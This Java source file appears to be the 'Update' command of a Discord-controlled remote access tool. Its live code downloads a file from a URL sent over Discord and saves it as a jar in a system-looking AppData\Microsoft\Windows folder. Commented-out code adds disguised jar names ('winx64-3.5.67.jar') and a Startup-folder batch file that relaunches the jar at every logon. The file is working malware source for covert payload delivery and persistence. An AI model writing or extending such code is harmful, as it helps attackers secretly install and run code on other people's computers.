package InvisibleCat.tabber.command.commands;

import InvisibleCat.tabber.command.Command;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;

public class Update implements Command {
    private String extra;
    private String displayMessage;
    private URL url;

    public Update(String displayMessage) {
        this.displayMessage = displayMessage;
    }

    @Override
    public String extraMessage() {
        return extra;
    }

    @Override
    public String displayMessage() {
        return displayMessage;
    }

    @Override
    public void run(ArrayList<String> args, Member author, Message message) {
        char letter = System.getProperty("user.home").charAt(0);
        try {
            if(args.get(2).equalsIgnoreCase("config")) {
                URL updater = new URL(args.get(3));
                InputStream in = updater.openStream();
                message.getChannel().sendMessage("Downloading updater...").queue();
                File file = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\update.jar");
                message.getChannel().sendMessage("Copying files...").queue();
                Files.copy(in, Path.of(String.valueOf(file)), StandardCopyOption.REPLACE_EXISTING);
                message.getChannel().sendMessage("Done!").queue();


            }

//                url = new URL(args.get(2));
//                InputStream in = url.openStream();
//                author.getUser().openPrivateChannel().flatMap(channel -> channel.sendMessage("Downloading...")).queue();
//                Path filePath = null;
//                File currentFile = new File(App.class.getProtectionDomain()
//                        .getCodeSource()
//                        .getLocation()
//                        .toURI()
//                        .getPath());
//                File winx64 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.66.jar");
//                File winx642 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.67.jar");
//
//
//                if(currentFile.getPath().equals(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.67.jar")) {
//                    if(winx64.exists()) {
//                        winx64.delete();
//                    }
//                    filePath = Path.of(String.valueOf(winx64));
//                } else {
//                    if (winx642.exists()) {
//                        winx642.delete();
//                    }
//                    filePath = Path.of(String.valueOf(winx642));
////                }
//
//
//
//                Files.copy(in, Paths.get(String.valueOf(filePath)), StandardCopyOption.REPLACE_EXISTING);
//                File f = new File(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
//                f.getParentFile().mkdirs();
//                f.createNewFile();
//                FileWriter writer = new FileWriter(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
//                writer.write("@echo off \n start javaw -jar " + filePath);
//                writer.close();
//                author.getUser().openPrivateChannel().flatMap(channel -> channel.sendMessage("Success!")).queue();
//
        } catch (IOException e) {
            author.getUser().openPrivateChannel().flatMap(channel -> channel.sendMessage("Error: " + Arrays.toString(e.getStackTrace()))).queue();
//
       }
//            return;
        //extra = "`Error`: Sorry, You do not have perms to push update";
    }
}
